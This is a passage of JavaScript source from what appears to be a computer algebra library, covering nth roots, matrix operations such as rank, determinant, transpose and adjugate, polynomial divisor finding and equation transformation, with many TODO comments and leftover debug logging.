          return new Expression.Exponentiation(x, Expression.ONE.divide(N));
        } else {
          //!TODO: fix
          if (n % 2 !== 0) {
            return Expression.ONE.negate()._nthRoot(n).multiply(new Expression.Exponentiation(x.negate(), Expression.ONE.divide(Expression.Integer.fromNumber(n))));
          }
        }
      }
      if (p.getDegree() > 1 && !p.getCoefficient(0).equals(Expression.ZERO)) {
        //TODO: check
        var N = p.getDegree();
        var t = v.multiply(p.getCoefficient(N)._nthRoot(N)).add(p.getCoefficient(0)._nthRoot(N));
        if (x.equals(t._pow(N))) {
          //!TODO: remove
          if (N >= n && (n % 2 !== 0 || Expression._isPositive(v))) {
            return t.pow(Expression.ONE).multiply(t._pow(N - n)._nthRoot(n));
          }
          //!
          if (n % 2 !== 0 || Expression._isPositive(v)) {
            return new Expression.Exponentiation(t, Expression.Integer.fromNumber(N).divide(Expression.Integer.fromNumber(n)));
          }
        }
        //TODO: (ax+b)**(n+1)
        if (p.getDegree() > 1 && p.getSquareFreePolynomial().equals(p) && n === 2) {//TODO: fix ?
          return new Expression.Exponentiation(x, Expression.ONE.divide(Expression.Integer.fromNumber(n)));
        }
        if (p.getDegree() > 1 && n === 3) {
          var d = simpleDivisor(x);
          return x.divide(d)._nthRoot(n).multiply(d._nthRoot(n));
        }
      }
    }

    if (n % 2 !== 0 && x instanceof Expression.ExponentiationOfMinusOne) {//?
      return getBase(x).pow(getExponent(x).divide(Expression.Integer.fromNumber(n)));
    }

    if (x instanceof Addition && x.b instanceof NthRoot && x.a instanceof NthRoot) {//TODO: ? multiple operands - ?
      var g = nthRootCommonFactor(x.a, x.b);
      if (!g.equals(Expression.ONE)) {
        return g._nthRoot(n).multiply(x.divide(g)._nthRoot(n));
      }
    }

    if (x instanceof Exponentiation && n === 3 && getExponent(x).equals(Integer.fromNumber(3))) {//TODO: other degrees (?)
      return getBase(x);
    }
    if (x instanceof Exponentiation && n === 2 && getExponent(x).equals(Integer.fromNumber(2))) {//TODO: other degrees (?)
      if (isPositive(getBase(x))) {
        return getBase(x);
      }
      if (isPositive(getBase(x).negate())) {
        return getBase(x).negate();
      }
    }

    var sd = simpleDivisor(x);
    if (!sd.equals(x)) {//TODO: FIX
      //debugger;
      //console.log(sd + '');
      //console.log(isPositive(sd));
      console.log(sd.toString());
      if (isPositive(sd) && (!(sd instanceof Addition) || !(x.divide(sd) instanceof Addition))) {
        if (!(sd._nthRoot(n) instanceof NthRoot)) {//TODO: !?
        return sd._nthRoot(n).multiply(x.divide(sd)._nthRoot(n));
        }
      }
    }

    var allowComplexSqrt = true;
    var isComplexNumber = function (x) {
      return Expression.isConstant(x) && !Expression.has(x, Expression.Sin) && !Expression.has(x, Expression.Cos);
    };
    if (typeof n === "number" && !isPositive(x) && allowComplexSqrt && isComplexNumber(x) && n === 2) {
      // https://en.wikipedia.org/wiki/Complex_number#Square_root
      var tmp = Expression.getComplexNumberParts(x);
      var a = tmp.real;
      var b = tmp.imaginary;
      //debugger;
      var tmp2 = a._pow(2).add(b._pow(2)).squareRoot();
      var gamma = a.add(tmp2).divide(Expression.TWO).squareRoot();
      var delta = Expression.Integer.fromNumber(b.sign()).multiply(a.negate().add(tmp2).divide(Expression.TWO).squareRoot());
      var result = gamma.add(delta.multiply(Expression.I));
      return result;
    }
    if (typeof n === "number" && (isPositive(x) || allowComplexSqrt && isComplexNumber(x) && n === 2)) {//?TODO: FIX
      var tmp = Expression.toPolynomialRoot(makeRoot(x, n));
      if (tmp != undefined) {
        return tmp;
      }
    }
    if (typeof n === "number" && isPositive(x.negate())) {
      var tmp = Expression.toPolynomialRoot(makeRoot(x.negate(), n));
      if (tmp != undefined) {
        return tmp.negate();
      }
    }

    if (getBase(x) instanceof Expression.Symbol && getBase(x).symbol.startsWith('$t') && typeof n === "number") {
      return getBase(x).pow(getExponent(x).divide(Expression.Integer.fromNumber(n)));
    }
    
    //!new
    //TODO: remove (move)
    if (Expression.isReal(x) && typeof n === "number") {
      if (isPositive(x)) {
        return new Expression.Exponentiation(x, Expression.Integer.fromNumber(n).inverse());//?
      } else {
        debugger;
      }
    }
    //!
    
    //TODO: !?
    if (n === 2 && !(this instanceof Expression.Exponentiation)) {
      console.log(this.toString());
      //debugger;
      if (Expression.has(this, Expression.Symbol)) {
        return new Expression.Exponentiation(x, Expression.Integer.fromNumber(n).inverse());
      }
      return NthRoot.makeRoot(this, n);
    }
    
    throw new RangeError("NotSupportedError");
  };

  function SquareRoot(a) {
    NthRoot.call(this, "sqrt", a, 2);
  }

  SquareRoot.prototype = Object.create(NthRoot.prototype);
  //!
  SquareRoot.prototype.divideInteger = function (x) {
    //TODO: check
    return x.multiply(this).divide(this.a);
  };

  Expression.prototype.squareRoot = function () {
    return this._nthRoot(2);
  };

  Expression.Rank = function (matrix) {
    Expression.Function.call(this, "rank", matrix);
  };
  Expression.Rank.prototype = Object.create(Expression.Function.prototype);

  Expression.prototype.rank = function () {
    var x = this;
    if (!(x instanceof Expression.Matrix)) {
      throw new RangeError("NotSupportedError:matrixArgExpected");//?
    }
    //!
    if (Expression.callback != undefined) {
      Expression.callback(new Expression.Event("rank", x));
    }
    //TODO: fix
    var cases = [];
    var rank = undefined;
    Matrix.toRowEchelonWithCallback(x.matrix, Matrix.GaussMontante, "", undefined, function (result) {
      var condition = result.condition;
      if (!condition.isTrue()) {
        var resultMatrix = result.matrix;
        cases.push(new ExpressionWithCondition(Integer.fromNumber(resultMatrix.rank()), condition));
      } else {
        rank = result.matrix.rank();
      }
    });
    if (cases.length !== 0) {
      return new Expression.Cases(cases);
    }
    //!
    return Integer.fromNumber(rank);
  };
  Expression.Determinant = function (matrix) {
    Expression.Function.call(this, "determinant", matrix);
  };
  Expression.Determinant.prototype = Object.create(Expression.Function.prototype);
  function isSquareMatrix(x) {
    if (x instanceof Expression.Matrix && x.matrix.isSquare()) {
      return true;
    }
    if (x instanceof Expression.Exponentiation && x.a instanceof Expression.MatrixSymbol && isIntegerOrN(x.b)) {
      return true;
    }
    return false;
  }
  Expression.prototype.determinant = function () {
    var x = this;
    if (x instanceof Expression.Multiplication && (isSquareMatrix(x.a) || isSquareMatrix(x.b))) {
      //TODO: ?
      if (Expression.callback != undefined) {
        Expression.callback(new Expression.Event("property-determinant-of-multiplication", {matrix: "{{0}}"}));
      }
      return x.a.determinant().multiply(x.b.determinant());
    }
    if (x instanceof Expression.Exponentiation && x.a instanceof Expression.MatrixSymbol && isIntegerOrN(x.b)) {
      //TODO: ?
      if (Expression.callback != undefined) {
        Expression.callback(new Expression.Event("property-determinant-of-multiplication", {matrix: "{{0}}"}));
      }
      return x.a.determinant().pow(x.b);
    }
    if (x instanceof Expression.MatrixSymbol) {
      return new Expression.Determinant(x);//?
    }
    if (isMatrixSymbolTranspose(x)) {//TODO: other cases
      return x.transpose().determinant();
    }
    if (!(x instanceof Expression.Matrix)) {
      throw new RangeError("NotSupportedError:matrixArgExpected");//?
    }
    //!
    if (Expression.callback != undefined) {
      Expression.callback(new Expression.Event(x.matrix.getDeterminantEventType("determinant").type, x));
    }
    return x.matrix.determinant();
  };
  Expression.RowReduce = function (matrix) {
    Expression.Function.call(this, "row-reduce", matrix);
  };
  Expression.RowReduce.prototype = Object.create(Expression.Function.prototype);
  Expression.prototype.rowReduce = function () {
    var x = this;
    if (!(x instanceof Expression.Matrix)) {
      throw new RangeError("NotSupportedError:matrixArgExpected");//?
    }
    //!
    if (Expression.callback != undefined) {
      Expression.callback(new Expression.Event("row-reduce".type, x));
    }
    //TODO: Matrix.GaussMontante
    return new Expression.Matrix(x.matrix.toRowEchelon(Matrix.GaussJordan, "", null).matrix);
  };
  Expression.Transpose = function (matrix) {
    Expression.Function.call(this, "transpose", matrix);
  };
  Expression.Transpose.prototype = Object.create(Expression.Function.prototype);
  Expression.prototype.transpose = function () {
    var x = this;
    if (x instanceof Expression.Multiplication) {
      //TODO: info about properties of the Matrix Transpose
      if (Expression.callback != undefined) {
        Expression.callback(new Expression.Event("property-transpose-of-multiplication", {matrix: "{{0}}"}));
      }
      return x.b.transpose().multiply(x.a.transpose());//TODO: ?
    }
    if (x instanceof Expression.Addition) {
      return x.a.transpose().add(x.b.transpose());
    }
    if (isScalar(x)) {
      return x;
    }
    if (!(getBase(x) instanceof MatrixSymbol) && x instanceof Expression.Exponentiation && x.b.equals(Expression.ONE.negate())) {
      //TODO: (X^-2)^T
      return x.a.transpose().pow(x.b);
    }
    if (x instanceof Expression.Exponentiation && x.b.equals(new Expression.Symbol("T"))) {
      //TODO: (X**2)^T
      return x.a;
    }
    if (getBase(x) instanceof MatrixSymbol) {
      var e = getExponent(x).multiply(new Expression.Symbol("T"));
      //TODO: ?
      var p = Polynomial.toPolynomial(e, new Expression.Symbol("T"));
      if (p.getDegree() >= 2) {
        e = e.subtract(p.getCoefficient(2).multiply(new Expression.Symbol("T")._pow(2))).add(p.getCoefficient(2));
      }
      return new Expression.Exponentiation(getBase(x), e);
    }
    if (!(x instanceof Expression.Matrix)) {
      throw new RangeError("NotSupportedError");//?
    }
    return new Expression.Matrix(x.matrix.transpose());
  };
  Expression.Adjugate = function (matrix) {
    Expression.Function.call(this, "adjugate", matrix);
  };
  Expression.Adjugate.prototype = Object.create(Expression.Function.prototype);
  Expression.prototype.adjugate = function () {
    var x = this;
    var property = function () {
      //TODO: ?
      if (Expression.callback != undefined) {
        Expression.callback(new Expression.Event("property-adjugate-of-multiplication", {matrix: "{{0}}"}));
      }
    };
    if (x instanceof Expression.Multiplication && (isSquareMatrix(x.a) || isSquareMatrix(x.b))) {
      property();
      return x.b.adjugate().multiply(x.a.adjugate());
    }
    if (x instanceof Expression.Exponentiation && x.a instanceof Expression.MatrixSymbol && isIntegerOrN(x.b)) {
      property();
      return x.a.adjugate().pow(x.b);
    }
    if (isMatrixSymbolTranspose(x)) {
      property();
      return x.transpose().adjugate().transpose();
    }
    if (x instanceof Expression.MatrixSymbol) {
      //TODO: ?
      //assuming x is an invertible square matrix
      return x.determinant().multiply(x.inverse());
      //TODO: ?
      //return new Expression.Cases([
      //  new ExpressionWithCondition(new Expression.Adjugate(x), Condition.TRUE.andZero(new Expression.Determinant(x))),
      //  new ExpressionWithCondition(x.determinant().multiply(x.inverse()), Condition.TRUE.andNotZero(new Expression.Determinant(x)))
      //]);
    }
    if (!(x instanceof Expression.Matrix)) {
      throw new RangeError("NotSupportedError:matrixArgExpected");//?
    }
    if (Expression.callback != undefined) {
      Expression.callback(new Expression.Event("adjugate", x));
    }
    if (x.matrix.rows() === 1 && x.matrix.cols() === 1) {
      return new Expression.Matrix(Matrix.I(1));
    }
    var det = x.matrix.determinant();
    if (Expression.isScalar(det) && !det.equals(Expression.ZERO)) {//TODO: other cases
      return new Expression.Matrix(x.matrix.inverse().scale(det));
    }
    //TODO: optimize
    var C = x.matrix.map(function (element, i, j, matrix) {
      return ((i + j) - 2 * Math.floor((i + j) / 2) === 1 ? Expression.ONE.negate() : Expression.ONE).multiply(matrix.minorMatrix(i, j).determinant());
    });
    var CT = new Expression.Matrix(C.transpose());
    return CT;
  };

  Expression.NoAnswerExpression = function (matrix, name, second) {
    Expression.Function.call(this, name, matrix);
    this.second = second;
  };
  Expression.NoAnswerExpression.prototype = Object.create(Expression.Function.prototype);
  //TODO: remove secondArgument (?)
  Expression.prototype.transformNoAnswerExpression = function (name, second) {
    second = second == undefined ? undefined : second;
    if (!(this instanceof Expression.Matrix)) {
      throw new RangeError("NotSupportedError");//?
    }
    if (name === "solve") {
      if (Expression.callback != undefined) {
        Expression.callback(new Expression.Event("solve", this));
      }
    }
    return new Expression.NoAnswerExpression(this, name, second);
  };

  //Expression.NoAnswerExpression.prototype.multiplyExpression =
  //Expression.NoAnswerExpression.prototype.multiplyMatrix =
  //Expression.NoAnswerExpression.prototype.multiplySymbol =
  //Expression.NoAnswerExpression.prototype.multiplyInteger =
  Expression.NoAnswerExpression.prototype.multiply = function () {
    throw new RangeError("NotSupportedError");
  };
  Expression.NoAnswerExpression.prototype.add = function () {
    throw new RangeError("NotSupportedError");
  };

  //TODO: remove (only for second)
  Expression.NoAnswerExpression.prototype.toString = function (options) {
    if (this.second == undefined) {
      return Expression.Function.prototype.toString.call(this, options);
    }
    return this.a.toString(setTopLevel(true, options)) + " " + this.name + " " + this.second.toString(setTopLevel(true, options));
  };


  Expression.ElementWisePower = function (a, b) {
    BinaryOperation.call(this, a, b);
  };
  Expression.ElementWisePower.prototype = Object.create(BinaryOperation.prototype);
  Expression.ElementWisePower.prototype.getS = function () {
    return ".^";
  };
  Expression.prototype.elementWisePower = function (e) {
    if (!(this instanceof Expression.Matrix)) {
      throw new RangeError("NotSupportedError");//?
    }
    return new Expression.Matrix(this.matrix.map(function (element, i, j) {
      return element.pow(e);
    }));
  };

  Expression.prototype.isRightToLeftAssociative = function () {
    var x = this;
    if (x instanceof Integer) {
      return x.compareTo(Expression.ZERO) < 0;
    }
    if (x instanceof Negation) {
      return true;
    }
    if (x instanceof BinaryOperation) {
      if (x.isNegation()) {
        return true;
      }
      return x instanceof Exponentiation;
    }
    return false;
  };

  var integerPrimeFactor = function (n) {
    return Integer.fromBigInt(primeFactor(n.value));
  };

  //?
  var simpleDivisor = function (e) {
    if (e instanceof Division) {
      throw new RangeError();
    }
    if (e instanceof Expression.Matrix) {
      throw new RangeError();
    }
    if (e instanceof Expression.Symbol) {
      return e;
    }
    if (e instanceof Integer) {
      var x = e;
      var i = x.compareTo(Expression.ZERO) < 0 ? x.negate() : x;
      if (i.compareTo(Expression.ONE) > 0) {
        return integerPrimeFactor(i);
      }
      return null;
    }
    if (e instanceof Expression.Complex) {
      //TODO: (!)
      var f = e.primeFactor();
      if (!f.equals(e) && e.divide(f) instanceof Expression.Integer) {
        f = f.multiply(Expression.I);
      }
      return f;
      /*
      var g = integerGCD(e.real, e.imaginary);
      var t = simpleDivisor(g);
      if (t != null) {
        return t;
      }
      if (typeof hit === "function") {
        hit({everySimpleDivisor: e.toString()});
      }
      return e;
      */
    }
    //var v = getVariable(e);
    // To avoid square roots / nth roots:
    var v = getVariableInternal(getLastMultiplicationOperand(getFirstAdditionOperand(e))).next().value.v;
    //if (v instanceof NthRoot || v instanceof Integer || v instanceof Expression.Complex) {
    //  v = undefined;
    //}
    if (v instanceof NthRoot && v.a instanceof Integer && v.n === 2) {//TODO: ???
      var p = getPolynomialRelativeToNthRoot(e, v.a, v.n);
      var f = p.getContent();
      if (!f.equals(Expression.ONE) && !f.equals(Expression.ONE.negate())) {
        return simpleDivisor(f);
      }
    }
    if (v != undefined) {
      v = getVariable(v);//!?TODO: FIX
      var r = getReplacement(e, v);
      if (!r.equals(v)) {
        return substitute(simpleDivisor(substitute(e, v, r, inverseReplacement(r, v))), v, inverseReplacement(r, v), r);
      }

      var np = Polynomial.toPolynomial(e, v);

      var content = np.getContent();
      var t = simpleDivisor(content);
      if (t != null) {
        return t;
      }
      var c = getConstant(np.getLeadingCoefficient());
      if (c instanceof Expression.Complex && c.real.equals(Expression.ZERO)) {
        return Expression.I;//!?
      }

      //?
      if (np.getCoefficient(0).equals(Expression.ZERO)) {
        return v;
      }

      if (np.getDegree() >= 2) {
        //TODO: square free polynomial - ?
        var root = np.doRationalRootTest();
        if (root != null) {
          var t = v.multiply(root.getDenominator()).subtract(root.getNumerator());
          return t;
        }
      }

      if (np.getDegree() >= 2 && np._hasIntegerLikeCoefficients()) {
        //TODO: TEST COVERAGE (!)
        var t = np.factorize();
        if (t != null) {
          //TODO: write a test case
          return simpleDivisor(t.calcAt(v));
        }
      }

      if (np.getDegree() >= 2 && !np._hasIntegerLikeCoefficients()) {
        //TODO: TEST COVERAGE (!)
        var t = np.squareFreeFactors();
        if (t.a0.getDegree() !== 0) {
          //TODO: write a test case
          return t.a0.scale(t.a0.getLeadingCoefficient().inverse()).calcAt(v);
        }
      }
      /*
      if (np.getDegree() >= 2) {
        var roots = np.getroots();
        if (roots.length > 0) {
          var root = roots[0];
          return v.subtract(root);
        }
      }
      */

      e = np.calcAt(v);
      if (e.isNegative()) {//TODO: remove - ?
        e = e.negate();//!?
      }
      return e;
    }
    throw new RangeError();//?
  };
  Expression.simpleDivisor = simpleDivisor;

  Expression.everyDivisor = function (e, callback) {
    if (e.equals(Expression.ZERO)) {
      return true;
    }
    if (!callback(Expression.ONE)) {
      return false;
    }
    var divisors = [];
    var rec = function (start, n, s) {
      if (n >= 0) {
        var x = divisors[n];
        for (var i = start; i <= x.e; i += 1) {
          if (!rec(0, n - 1, s.multiply(Expression.pow(x.d, i)))) {
            return false;
          }
        }
      } else {
        if (!callback(s)) {
          return false;
        }
      }
      return true;
    };
    while (!e.equals(Expression.ONE) && !e.equals(Expression.ONE.negate())) {
      var d = simpleDivisor(e);
      if (divisors.length === 0 || !divisors[divisors.length - 1].d.equals(d)) {
        divisors.push({
          d: d,
          e: 0
        });
      }
      divisors[divisors.length - 1].e += 1;
      if (!rec(divisors[divisors.length - 1].e, divisors.length - 1, Expression.ONE)) {
        return false;
      }
      e = e.divide(d);
    }
    return true;
  };

  Expression.Integer = Integer;
  Expression.NthRoot = NthRoot;
  Expression.SquareRoot = SquareRoot;
  Expression.Negation = Negation;
  Expression.Subtraction = Subtraction;
  Expression.BinaryOperation = BinaryOperation;
  Expression.Exponentiation = Exponentiation;
  Expression.Multiplication = Multiplication;
  Expression.Addition = Addition;
  Expression.Division = Division;
  //TODO: remove
  Expression.pow = function (x, count) {
    return x._pow(count);
  };
  Expression.prototype._pow = function (count) {
    return pow(this, count, Expression.ONE);
  };
  Expression.Integer.prototype._pow = function (count) {
    // for performance (?)
    if (typeof count === "number" && Math.floor(count) === count && count >= 0 && count <= Number.MAX_SAFE_INTEGER) {
      return new Integer(SmallBigInt.exponentiate(this.value, SmallBigInt.BigInt(count)));
    }
    return Expression.prototype._pow.call(this, count);
  };
  Expression.Integer.prototype._nthRoot = function (n) {
    // for performance (?)
    //TODO: fix (more cases)
    if (typeof n === "number" && n === 2 && this.equals(this.abs()) && isPerfectSquare(this)) {
      return this._integerNthRoot(2);
    }
    if (typeof n === "number" && n === 3 && isPerfectCube(this)) {
      return this._integerNthRoot(3);
    }
    //TODO: move !!!
    if (typeof n === "number" && n === 2 && this.equals(this.abs())) {
      var x = this;
      var a = Expression.ONE;
      var s = Expression.ONE;
      while (!isPerfectSquare(x)) {
        var f = Integer.fromBigInt(primeFactor(x.toBigInt()));
        var multiplicity = primeFactor._countTrailingZeros(x.toBigInt(), f.toBigInt());
        x = x.divide(f._pow(multiplicity));
        if (multiplicity % 2 === 1) {
          //var g = a.gcd(f);
          //if (!g.equals(Expression.ONE)) {
          //  f = f.divide(g);
          //  a = a.divide(g);
          //  a = a.multiply(g);
          //}
          //s.push(f);
          s = s.multiply(f);
          multiplicity -= 1;
        }
        a = a.multiply(f._pow(multiplicity / 2));
      }
      return x.squareRoot().multiply(a).multiply(new SquareRoot(s));
    }
    return Expression.prototype._nthRoot.call(this, n);
  };
  Expression.Integer.prototype._isPerfectSquare = function () {
    if (this.sign() < 0) {
      return false;
    }
    return isPerfectSquare(this);
  };
  Integer.prototype._integerNthRoot = function (n) {
    return new Integer(SmallBigInt.BigInt(primeFactor._integerNthRoot(this.toBigInt(), n)));
  };
  Integer.prototype.bitLength = function () {
    return primeFactor._bitLength(this.toBigInt());
  };
  Integer.prototype.modInverse = function (p) {
    return Expression.Integer.fromBigInt(primeFactor._modInverse(this.toBigInt(), p.toBigInt()));
  };
  Integer.prototype.modulo = function modulo(p) {
    var r = this.remainder(p);
    return r.compareTo(Expression.ZERO) < 0 ? r.add(p) : r;
  };
  // ---





  Expression.Equality = function (a, b) {
    BinaryOperation.call(this, a, b);
  };

  Expression.Equality.prototype = Object.create(BinaryOperation.prototype);
  Expression.Equality.prototype.getS = function () {
    return "=";
  };

  Expression.Inequality = function (a, b, sign) {
    BinaryOperation.call(this, a, b);
    this.sign = sign;
  };

  Expression.Inequality.prototype = Object.create(BinaryOperation.prototype);
  Expression.Inequality.prototype.getS = function () {
    return this.sign;
  };

  function AdditionIterator(e) {
    if (e == undefined) {
      throw new TypeError();
    }
    this.value = undefined;
    this.e = e;
  }
  AdditionIterator.prototype = Object.create(Iterator.prototype);
  AdditionIterator.prototype.next = function () {
    this.value = this.e instanceof Addition ? this.e.b : this.e;
    this.e = this.e instanceof Addition ? this.e.a : undefined;
    return this;
  };

  function MultiplicationIterator(e) {
    if (e == undefined) {
      throw new TypeError();
    }
    this.value = undefined;
    this.e = e;
  }
  MultiplicationIterator.prototype = Object.create(Iterator.prototype);
  MultiplicationIterator.prototype.next = function () {
    this.value = this.e instanceof Multiplication ? this.e.b : this.e;
    this.e = this.e instanceof Multiplication ? this.e.a : null;
    return this;
  };

  Expression.prototype.summands = function () {
    return new AdditionIterator(this);
  };

  Expression.prototype.factors = function () {
    return new MultiplicationIterator(this);
  };

  var splitX = function (e) {
    var scalar = undefined;
    var l = undefined;
    var r = undefined;
    var xx = undefined;
    for (var iteratorx = e.summands()[globalThis.Symbol.iterator](), x = iteratorx.next().value; x != null; x = iteratorx.next().value) {
      //TODO: why iteration by additions - (?)
      var state = 0;
      for (var iteratory = x.factors()[globalThis.Symbol.iterator](), y = iteratory.next().value; y != null; y = iteratory.next().value) {
        var factor = y;
        var factorBase = getBase(y);
        var factorExponent = getExponent(y);
        /*if ((!(factorBase instanceof Integer) && !(factorBase instanceof Expression.Symbol) && !(factorBase instanceof Expression.Matrix)) ||
            !(factorExponent instanceof Integer) && !(factorExponent instanceof Expression.Symbol && factorExponent.toString() === "T")) {//TODO: fix
          throw new RangeError("NotSupportedError");
        }*/
        var s = factorBase instanceof Expression.Symbol ? factorBase.toString() : "";
        if (s === "X" && state === 0) {
          state = 1;
          xx = factor;
        } else {
          if (isScalar(factor)) {
            scalar = scalar == undefined ? factor: factor.multiply(scalar);
          } else {
            if (state === 0) {
              r = r == undefined ? factor : factor.multiply(r);
            }
            if (state === 1) {
              l = l == undefined ? factor : factor.multiply(l);
            }
          }
        }
      }
    }
    scalar = scalar == undefined ? Expression.ONE : scalar;
    return {s: scalar, l: l, r: r, x: xx};
  };
  Expression.splitX = splitX;
  var groupX = function (a, b) {
    var tmp1 = splitX(a);
    var tmp2 = splitX(b);
    var s1 = tmp1.s;
    var l1 = tmp1.l;
    var r1 = tmp1.r;
    var s2 = tmp2.s;
    var l2 = tmp2.l;
    var r2 = tmp2.r;
    if (r1 == undefined && r2 == undefined && tmp1.x.equals(tmp2.x)) {
      l1 = l1 == undefined ? new IdentityMatrix("I") : l1;
      l2 = l2 == undefined ? new IdentityMatrix("I") : l2;
      return new Multiplication(s1.multiply(l1).add(s2.multiply(l2)), tmp1.x);
    }
    if (l1 == undefined && l2 == undefined && tmp1.x.equals(tmp2.x)) {
      r1 = r1 == undefined ? new IdentityMatrix("I") : r1;
      r2 = r2 == undefined ? new IdentityMatrix("I") : r2;
      return new Multiplication(tmp1.x, s1.multiply(r1).add(s2.multiply(r2)));
    }
    return undefined;
  };

  //TODO: remove (replace with a Condition) - ?
  //?
  var getExpressionWithX = function (e) {
    if (e instanceof Division) {
      if (e.getDenominator() instanceof Expression.Integer) {
        e = e.getNumerator();//!
      } else {
        return {withX: undefined, withoutX: undefined};
      }
    }

    var withX = undefined;
    var withoutX = undefined;
    for (var iteratorx = e.summands()[globalThis.Symbol.iterator](), x = iteratorx.next().value; x != null; x = iteratorx.next().value) {
      var summand = x;
      var hasX = false;
      for (var iteratory = x.factors()[globalThis.Symbol.iterator](), y = iteratory.next().value; y != null; y = iteratory.next().value) {
        var factor = y;
        var factorBase = getBase(factor);
        //!new2019-12-03
        if (factorBase instanceof Addition && getExponent(factor).isNegative()) { // (<matrix addition>)**-1 (?)
          //TODO: fix
          var q = null; // e.subtract(x)
          for (var iteratorx1 = e.summands()[globalThis.Symbol.iterator](), x1 = iteratorx1.next().value; x1 != null; x1 = iteratorx1.next().value) {
            if (x1 !== x) {
              q = q == null ? x1 : q.add(x1);
            }
          }
          var exponent = getExponent(factor).negate();
          var e1 = q.multiply(factorBase.pow(exponent)).add(x.multiply(new Expression.Exponentiation(factorBase, exponent)));
          var z2 = e1.transformEquality(Expression.ZERO);
          //TODO:
          //var tmp = Polynomial.toPolynomial(factorBase, z2.a).calcAt(z2.b);
          var variable = getExponent(z2.a) instanceof Expression.Symbol ? z2.a : getBase(z2.a);
          var tmp = Polynomial.toPolynomial(factorBase, variable).divideAndRemainder(Polynomial.toPolynomial(z2.a.subtract(z2.b), variable)).remainder.calcAt(variable);
          var d = tmp instanceof Expression.Matrix ? tmp.determinant() : null;
          if (!Expression.isConstant(d)) {//TODO: ?
            return {withX: undefined, withoutX: undefined};
          }
          if (d.equals(Expression.ZERO)) {
            return {withX: Expression.ZERO, withoutX: Expression.ONE};//TODO: no solutions
          }
          return getExpressionWithX(e1);//!hack
        }
        //!
        //!2020-06-14
        if (factorBase instanceof MatrixSymbol && getExponent(factor).isNegative()) { // (<matrix addition>)**-1 (?)
          var exponent = getExponent(factor).negate();
          // if the multiplication will "remove" the factor
          var e1 = x.b.equals(factor) ? e.multiply(factorBase.pow(exponent)) : (Array.from(factorBase.pow(exponent).multiply(x).factors()).length < Array.from(x.factors()).length ? factorBase.pow(exponent).multiply(e) : null);
          //TODO: determinant(X) != 0
          //?
          /*
          var g = null;
          for (var iteratorx = e1.summands()[globalThis.Symbol.iterator](), x = iteratorx.next().value; x != null; x = iteratorx.next().value) {
            var y = x.factors().next().value;
            if (getBase(y) instanceof Expression.MatrixSymbol) {//TODO: FIX
              g = g == null ? y : y.gcd(g);
            } else {
              g = Expression.ONE;
            }
          }
          if (g != null && !g.equals(Expression.ONE)) {
            e1 = e1.multiply(g.inverse());//!?
          }
          */
          //?
          if (e1 != null) {
            return getExpressionWithX(e1);
          }
        }
        //!
        if (!(factorBase instanceof Integer) && !(factorBase instanceof Expression.Symbol)) {
          if (!(factorBase instanceof Expression.Matrix)) {//?
          if (!(factorBase instanceof NthRoot)) {//?TODO: remove - ?
          if (factorBase instanceof Expression.Determinant && factorBase.a.toString() === "X") {//TODO: wrong
            return {withX: null, withoutX: null};
          }
          if (Expression.has(factorBase, Expression.MatrixSymbol)) {//?
            throw new RangeError("NotSupportedError");
          }
          }
          }
        }
        if (factorBase instanceof Expression.Symbol) {
          var s = factorBase.toString();
          if (s === "X") {
            if (hasX) {
              //throw new RangeError("NotSupportedError");
              return {withX: null, withoutX: null};
            }
            hasX = true;
          }
        }
      }
      if (hasX) {
        if (withX != undefined) {
          withX = groupX(withX, summand);
          if (withX == null) {
            //throw new RangeError("NotSupportedError");
            return {withX: null, withoutX: null};
          }
          //throw new RangeError("NotSupportedError");
        } else {
          withX = summand;
        }
      }
      if (!hasX) {
        withoutX = withoutX == undefined ? summand.negate() : withoutX.subtract(summand);
      }
    }
    return {withX: withX, withoutX: withoutX};
  };

  // Some number, including e and pi
  var isConstant = function (e) {
    if (e instanceof Expression.BinaryOperation) {
      return isConstant(e.b) && isConstant(e.a);
    } else if (e instanceof Expression.Integer) {
      return true;
    } else if (e instanceof Expression.PolynomialRootSymbol) { // note: e instanceof Expression.Symbol for now (!) so this check should go first
      return true;
    } else if (e instanceof Expression.ExpressionWithPolynomialRoot) {
      return isConstant(e.e);
    } else if (e instanceof Expression.ExpressionPolynomialRoot) { // note: e instanceof Expression.Symbol for now (!) so this check should go first
      return true;
    } else if (e instanceof Expression.Symbol) {
      return e === Expression.E || e === Expression.PI;
    } else if (e instanceof Expression.Complex) {
      return true;
    } else if (e instanceof Expression.NthRoot) {
      return isConstant(e.a);
    } else if (e instanceof Expression.Sin || e instanceof Expression.Cos) {
      return isConstant(e.a);
    } else if (e instanceof Expression.Radians) {
      return isConstant(e.value);
    //TODO:
    } else if (e instanceof Expression.Logarithm) {
      return isConstant(e.a);//TODO: test
    } else if (e === Expression.E || e === Expression.PI) {
      return true;
    }
    return false;
  };
  
  Expression.isConstant = isConstant;

  Expression.getMultivariatePolynomial = function (e) {
    if (e instanceof Expression.Division) {
      return undefined;
    }
    //var v = Expression.getVariable(e);
    // To avoid square roots / nth roots:
    var v = getVariableInternal(getLastMultiplicationOperand(getFirstAdditionOperand(e))).next().value.v;
    if (v instanceof NthRoot || v instanceof Integer || v instanceof Expression.Complex) {
      v = undefined;
    }
    if (v == undefined) {
      //throw new TypeError("undefined");
      return undefined;
    }
    //?
    if (v instanceof Expression.Addition) {
      v = getVariableInternal(getLastMultiplicationOperand(getFirstAdditionOperand(v))).next().value.v;
    }
    //?

    //TODO:
    var r = getReplacement(e, v);
    if (!r.equals(v)) {
      e = substitute(e, v, r, inverseReplacement(r, v));
      if (e instanceof Expression.Division && e.b instanceof Expression.Integer) {
        e = e.a;//!
      }
    }

    var p = Polynomial.toPolynomial(e, v);
    if (p.getDegree() === 0) {
      console.warn('Expression.getMultivariatePolynomial');
      return undefined;
    }
    //TODO: iteration by sparse coefficients
    for (var i = 0; i <= p.getDegree(); i += 1) {
      var c = p.getCoefficient(i);
      if (!isConstant(c)) {
        var pc = Expression.getMultivariatePolynomial(c);
        if (pc == undefined) {
          return undefined;
        }
      }
    }
    return {p: p.map(function (c) { return substitute(c, v, inverseReplacement(r, v), r); }), v: inverseReplacement(r, v)};
  };
  Expression.isSingleVariablePolynomial = function (e) {
    var tmp = Expression.getMultivariatePolynomial(e);
    if (tmp == null) {
      return false;
    }
    var p = tmp.p;
    //TODO: iteration by sparse coefficients
    for (var i = 0; i <= p.getDegree(); i += 1) {
      var c = p.getCoefficient(i);
      if (!isConstant(c)) {
        return false;
      }
    }
    return true;
  };

  // TODO: NotSupportedError
  Expression.prototype.transformEquality = function (b) {
    var e = this.subtract(b);
    var tmp = getExpressionWithX(e);
    var withX = tmp.withX;
    var withoutX = tmp.withoutX;
